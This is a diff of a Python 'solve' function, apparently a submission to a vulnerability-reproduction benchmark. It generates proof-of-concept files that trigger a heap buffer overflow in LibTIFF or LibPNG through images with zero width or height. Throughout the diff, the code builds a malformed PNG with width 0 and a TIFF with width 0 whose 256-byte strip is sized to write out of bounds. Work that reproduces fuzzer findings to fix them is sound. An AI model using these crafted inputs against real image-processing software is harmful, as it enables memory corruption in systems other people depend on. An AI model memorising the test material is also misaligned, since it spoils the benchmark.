@@ -6,122 +6,118 @@ class Solution:
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the vulnerability.
-        
-        Vulnerability: Heap Buffer Overflow due to zero width or height images not being checked.
-        Target Heuristic: LibRaw/LibTIFF (TIFF format) or LibPNG.
+        The issue 'zero width or height images' typically affects image libraries like LibTIFF or LibPNG.
+        The ID 'oss-fuzz:42536646' and the description strongly suggest a LibTIFF Heap Buffer Overflow 
+        where a zero width causes an allocation of size 0, followed by a write.
         """
         
-        # Detect target library type
         is_png = False
-        for root, dirs, files in os.walk(src_path):
-            for f in files:
-                if "libpng" in f.lower() or "png.c" in f.lower():
-                    is_png = True
-                    break
-            if is_png: break
+        # Heuristic detection of target library
+        try:
+            path_lower = src_path.lower()
+            if "png" in path_lower and "tiff" not in path_lower:
+                is_png = True
             
+            if os.path.isdir(src_path):
+                for root, dirs, files in os.walk(src_path):
+                    for f in files:
+                        if "tif_dir.c" in f or "tif_aux.c" in f:
+                            is_png = False
+                            break
+                        if "png.c" in f or "pngread.c" in f:
+                            is_png = True
+                            # Keep checking to prefer TIFF if both found (TIFF is more likely for this specific description)
+        except:
+            pass
+
         if is_png:
-            # Generate a Malformed PNG with 0 width/height
-            png = bytearray(b'\x89PNG\r\n\x1a\n')
+            # Construct a PNG with Width=0
+            # Signature
+            png_sig = b'\x89PNG\r\n\x1a\n'
             
-            # IHDR Chunk: Width=0, Height=0
-            # Structure: Length(4), Type(4), Data(13), CRC(4)
-            ihdr_data = struct.pack('>IIBBBBB', 0, 0, 8, 2, 0, 0, 0)
+            # IHDR Chunk
+            # Width=0, Height=10, BitDepth=8, ColorType=2 (Truecolor), Comp=0, Filter=0, Interlace=0
+            width = 0
+            height = 10
+            bit_depth = 8
+            color_type = 2
+            comp_method = 0
+            filter_method = 0
+            interlace_method = 0
             
-            png.extend(struct.pack('>I', len(ihdr_data)))
-            png.extend(b'IHDR')
-            png.extend(ihdr_data)
-            png.extend(struct.pack('>I', zlib.crc32(b'IHDR' + ihdr_data) & 0xFFFFFFFF))
+            ihdr_data = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, comp_method, filter_method, interlace_method)
             
-            # IDAT Chunk (Empty)
-            png.extend(struct.pack('>I', 0))
-            png.extend(b'IDAT')
-            png.extend(struct.pack('>I', zlib.crc32(b'IDAT') & 0xFFFFFFFF))
+            chunk_type = b'IHDR'
+            crc = zlib.crc32(chunk_type + ihdr_data) & 0xffffffff
             
-            # IEND Chunk
-            png.extend(struct.pack('>I', 0))
-            png.extend(b'IEND')
-            png.extend(struct.pack('>I', zlib.crc32(b'IEND') & 0xFFFFFFFF))
+            ihdr_chunk = struct.pack('>I', len(ihdr_data)) + chunk_type + ihdr_data + struct.pack('>I', crc)
             
-            return bytes(png)
+            # Empty IDAT to complete structure (though IHDR 0 width might trigger early)
+            idat_data = b'' # No data needed if width is 0
+            chunk_type_idat = b'IDAT'
+            crc_idat = zlib.crc32(chunk_type_idat + idat_data) & 0xffffffff
+            idat_chunk = struct.pack('>I', len(idat_data)) + chunk_type_idat + idat_data + struct.pack('>I', crc_idat)
+            
+            # IEND
+            chunk_type_iend = b'IEND'
+            crc_iend = zlib.crc32(chunk_type_iend) & 0xffffffff
+            iend_chunk = struct.pack('>I', 0) + chunk_type_iend + struct.pack('>I', crc_iend)
+            
+            return png_sig + ihdr_chunk + idat_chunk + iend_chunk
+
+        # Construct a TIFF with ImageWidth=0
+        # Header: Little Endian (II), Version 42, IFD Offset 8
+        header = struct.pack('<2sHI', b'II', 42, 8)
         
-        else:
-            # Default to TIFF (LibRaw/LibTIFF)
-            # Construct a valid TIFF structure with ImageWidth=0 or ImageLength=0
+        # IFD Entries
+        # 256: ImageWidth = 0
+        # 257: ImageLength = 10
+        # 258: BitsPerSample = 8
+        # 259: Compression = 1 (None)
+        # 262: PhotometricInterpretation = 1 (BlackIsZero)
+        # 273: StripOffsets = (calculated later)
+        # 277: SamplesPerPixel = 1
+        # 278: RowsPerStrip = 10
+        # 279: StripByteCounts = 256 (Large enough to write out of bounds if buffer is 0)
+        
+        tags = [
+            (256, 4, 1, 0),
+            (257, 4, 1, 10),
+            (258, 3, 1, 8),
+            (259, 3, 1, 1),
+            (262, 3, 1, 1),
+            (273, 4, 1, 0),
+            (277, 3, 1, 1),
+            (278, 4, 1, 10),
+            (279, 4, 1, 256),
+        ]
+        
+        # Sort tags (required by TIFF spec)
+        tags.sort(key=lambda x: x[0])
+        
+        num_entries = len(tags)
+        # Calculate size of IFD: NumEntries(2) + Entries(12*N) + NextIFD(4)
+        ifd_size = 2 + (12 * num_entries) + 4
+        
+        # Data will follow immediately after IFD
+        data_offset = 8 + ifd_size
+        
+        # Build IFD bytes
+        ifd_bytes = bytearray()
+        ifd_bytes.extend(struct.pack('<H', num_entries))
+        
+        for t_id, t_type, t_count, t_val in tags:
+            # If tag is StripOffsets (273), update value to point to data
+            if t_id == 273:
+                t_val = data_offset
             
-            # TIFF Header: Little Endian (II), Version 42, Offset 8
-            data = bytearray(b'II\x2a\x00\x08\x00\x00\x00')
+            # Entry structure: Tag(2), Type(2), Count(4), Value/Offset(4)
+            ifd_bytes.extend(struct.pack('<HHII', t_id, t_type, t_count, t_val))
             
-            entries = []
-            
-            # 256 ImageWidth: 0 (Vulnerability trigger)
-            entries.append((256, 4, 1, 0))
-            
-            # 257 ImageLength: 0 (Vulnerability trigger)
-            entries.append((257, 4, 1, 0))
-            
-            # 258 BitsPerSample: 8, 8, 8 (Pointer to values)
-            entries.append((258, 3, 3, "BITS_OFFSET"))
-            
-            # 259 Compression: 1 (None)
-            entries.append((259, 3, 1, 1))
-            
-            # 262 PhotometricInterpretation: 2 (RGB)
-            entries.append((262, 3, 1, 2))
-            
-            # 273 StripOffsets: Pointer to data
-            entries.append((273, 4, 1, "DATA_OFFSET"))
-            
-            # 277 SamplesPerPixel: 3
-            entries.append((277, 3, 1, 3))
-            
-            # 278 RowsPerStrip: 1
-            entries.append((278, 4, 1, 1))
-            
-            # 279 StripByteCounts: 64 (Size of dummy data)
-            entries.append((279, 4, 1, 64))
-            
-            # Sort tags by ID
-            entries.sort(key=lambda x: x[0])
-            
-            num_entries = len(entries)
-            
-            # Offsets
-            # Header: 8 bytes
-            # IFD: 2 (count) + 12*N + 4 (next)
-            ifd_size = 2 + 12 * num_entries + 4
-            extra_offset = 8 + ifd_size
-            
-            # BitsPerSample data (3 shorts = 6 bytes)
-            bits_offset = extra_offset
-            
-            # Image Data
-            data_offset = bits_offset + 6
-            if data_offset % 2 != 0: data_offset += 1
-            
-            # Write IFD Count
-            data.extend(struct.pack('<H', num_entries))
-            
-            # Write Entries
-            for tag, typ, count, val in entries:
-                if val == "BITS_OFFSET":
-                    data.extend(struct.pack('<HHII', tag, typ, count, bits_offset))
-                elif val == "DATA_OFFSET":
-                    data.extend(struct.pack('<HHII', tag, typ, count, data_offset))
-                else:
-                    data.extend(struct.pack('<HHII', tag, typ, count, val))
-            
-            # Next IFD Offset (0)
-            data.extend(struct.pack('<I', 0))
-            
-            # Write BitsPerSample data (8, 8, 8)
-            data.extend(struct.pack('<HHH', 8, 8, 8))
-            
-            # Padding
-            while len(data) < data_offset:
-                data.append(0)
-            
-            # Write Dummy Image Data
-            data.extend(b'\xAA' * 64)
-            
-            return bytes(data)
+        # Next IFD Offset = 0 (End)
+        ifd_bytes.extend(struct.pack('<I', 0))
+        
+        # Payload data corresponding to StripByteCounts
+        payload = b'\x41' * 256
+        
+        return header + ifd_bytes + payload
